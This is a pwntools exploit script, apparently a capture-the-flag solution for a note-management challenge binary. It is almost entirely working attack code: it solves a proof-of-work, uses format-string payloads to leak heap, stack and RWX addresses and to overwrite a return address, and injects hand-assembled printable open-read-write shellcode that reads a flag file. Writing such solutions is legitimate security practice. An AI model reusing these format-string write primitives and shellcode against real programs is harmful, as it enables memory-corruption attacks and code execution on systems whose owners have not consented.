from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'localhost'
PORT = 3333

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def num_to_charseq(num, charset=string.ascii_letters):
    res = ""
    while True:
        if num < len(charset):
            res += charset[num]
            break
        res += charset[num % len(charset)]
        num //= len(charset)
    return res


def solve_pow(init_str, end_hash):
    num = 0
    while True:
        try_solve = init_str + num_to_charseq(num)
        if hashlib.sha256(try_solve.encode('ascii')).hexdigest().lower().endswith(end_hash.lower()):
            return try_solve
        num += 1

def pow_solve(r):
	# Solve PoW (this can be activated or deactivated)
	if r.recvuntil(b"Give me a string", timeout=0.5):
		proc = log.progress('PoW Required, solving...')
		r.recvuntil(b"starting in ")
		init_string = r.recvuntil(b" ")[:-1]
		r.recvuntil(b"ends in ")
		hash_end = r.recvuntil(b".")[:-1]
		r.sendline(solve_pow(init_string.decode(), hash_end.decode()).encode())
		proc.success('PoW Solved, Starting Exploit')
	else:
		log.info("PoW not required, starting exploit")
	return

r = start()
if args.R:
	pow_solve(r)


def a(name, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'By > ', name)
    r.sendlineafter(b'tion > ', data)

def e(idx, name, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b') > ', str(idx).encode())
    r.sendlineafter(b'By > ', name)
    r.sendlineafter(b'tion > ', data)

def d(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b') > ', str(idx).encode())

def v(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b') > ', str(idx).encode())

def vl():
    r.sendlineafter(b'> ', b'5')

def el(name, data):
    r.sendlineafter(b'> ', b'6')
    r.sendlineafter(b'By > ', name)
    r.sendlineafter(b'tion > ', data)

def dl():
    r.sendlineafter(b'> ', b'7')

def vall():
    r.sendlineafter(b'> ', b'8')

def dall():
    r.sendlineafter(b'> ', b'9')

def fake_last(idx):
    assert idx == 0 or idx > 20
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(idx).encode())
    r.sendlineafter(b'> ', b'-1')

# alloc rwx
a(b'a', b'b')

# set 0
fake_last(0)

# delete 0
dl()

# alloc heap
a(b'a', b'%20$p|%21$p')

# leak heap, checksum
vl()
r.recvuntil(b'details:')
r.recvuntil(b'\n')
r.recvuntil(b'\n')
leak = int(r.recvuntil(b'|', True), 16)
main_ret = leak + 0xd8-0xa0

# calcurate randv from checksum
xored = int(r.recvuntil(b'\n', True), 16)

check = xored >> (8*6)
cs = 0
for i in range(6):
	b = (xored >> (i * 8)) & 0xff
	cs ^= b

for i in range(8):
	b = (leak >> (i * 8)) & 0xff
	cs ^= b

randv = check ^ ((cs << 8)| cs)

print(f"{leak:x}, {xored:x}")
print(f"{check:x}, {cs:x}, {randv:x}")

# leak stack
a(b'a', b'%35$p')
vl()
r.recvuntil(b'details:')
r.recvuntil(b'\n')
r.recvuntil(b'\n')
saved = int(r.recvuntil(b'\n', True), 16)

# leak rwx
v(1)
r.recvuntil(b'details:')
rwx = int(r.recvuntil(b'\n', True), 16) + 0x14

cs = 0
for i in range(6):
	b = (rwx >> (i * 8)) & 0xff
	cs ^= b

check = randv ^ ((cs << 8)| cs)

# overwrite main_ret with 2 staged fsb
for i in range(8):
	payload = b''
	payload += f'%{i+(main_ret & 0xffff)}c%35$hn'.encode()
	e(1, b'1', payload)
	vl()

	payload = b''
	b = ((check << (8*6)|rwx+1)>>(i*8)) & 0xff
	if b == 0:
		b = 0x100
	payload += f'%{b}c%65$hhn'.encode()
	e(1, b'1', payload)
	vl()

# put printable orw shellcode
flag_file = b'pizza_secret_recipe\x00'
payload = b''
payload += asm('''
	pop rdi
	push rax
	push rax
	push rax
	push rax
	push rax
	pop rbx
	pop rcx
	pop rdx
	pop rdi
	pop r10

	push rsi
	popw ax
	popw bx
	popw cx

	pushw dx
	pushw cx
	pushw bx
	pushw ax
	pop rcx
	popw dx

''')
for i in range(len(flag_file), 0, -2):
	#print(flag_file[i-2:i])
	payload += asm(f'''
		pushw {u16(flag_file[i-2:i])}
	''')
payload += asm('''
	push rsp
	pop rdi
	push 0x41414141
	pushw 0x4141
	popw ax
	xor dword ptr [rcx+0x63],eax
	''')
payload += asm('''
	push 0x30
	pop rax
	xor al, 0x30
	push rax
	push rax
	pop rsi
	pop rdx
	push 0x32
	pop rax
	xor al, 0x30
	push rcx
''')
payload += b'\x4e\x44'
payload += asm('''
	pop rcx
	push rdx
	push rax
	pop rdi
	pop rax
	pop rdx
	push rsp
	pop rsi
	push rax
	pushw 0x4141
	popw ax
	xor dword ptr [rcx+0x79],eax
	pop rax
	push rcx
''')
payload += b'\x4e\x44'
payload += asm('''
	push rax
	pop rdx
	pop rax
	xor al, 0x75
	push rax
	pop rcx
	push rbp
	push rbp
	pop rdi
	pushw 0x4141
	popw ax
	xor dword ptr [rcx+0x64],eax
	pop rax
''')
payload += b'\x4e\x44'
e(1, b'1', payload)

if args.D:
	debug(r, [0x2e37])

context.log_level = 'debug'

# exit to trigger
r.sendlineafter(b'> ', b'-1')
r.interactive()
r.close()
